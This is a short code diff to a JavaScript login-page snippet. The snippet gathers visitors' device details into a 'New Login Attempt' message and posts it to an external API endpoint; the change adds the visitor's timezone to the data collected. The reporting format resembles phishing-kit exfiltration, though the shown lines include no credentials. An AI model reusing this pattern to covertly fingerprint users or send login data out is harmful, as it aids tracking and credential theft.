@@ -84,6 +84,7 @@
                 const screenWidth = screen.width;
                 const screenHeight = screen.height;
                 const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
                 const message = ` 
                     <b>New Login Attempt</b>\n
@@ -93,7 +94,8 @@
                     <b>Device Type:</b> ${deviceType}\n
                     <b>Platform:</b> ${platform}\n
                     <b>User Agent:</b> ${userAgent}\n
-                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}\n
+                    <b>Timezone:</b> ${timezone}
                 `;
 
                 axios.post(URI_API, {
